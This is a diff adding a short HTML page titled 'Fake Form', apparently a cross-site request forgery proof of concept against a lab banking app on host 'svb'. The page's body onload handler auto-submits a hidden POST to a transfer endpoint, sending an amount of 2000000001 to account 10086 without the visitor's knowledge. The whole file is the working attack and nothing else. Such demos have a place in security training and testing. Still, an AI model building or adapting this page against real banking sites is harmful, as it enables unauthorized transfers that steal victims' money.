@@ -1,0 +1,11 @@
+<html>
+  <head>
+    <title>Fake Form</title>
+  </head>
+  <body onload="document.bank_form.submit()">
+   <form action="http://svb:5003/transfer/1" method="POST" name="bank_form" >
+      <input type="text" name="amount" value="2000000001">   
+      <input type="text" name="account" value="10086">
+    </form>
+  </body>
+</html>
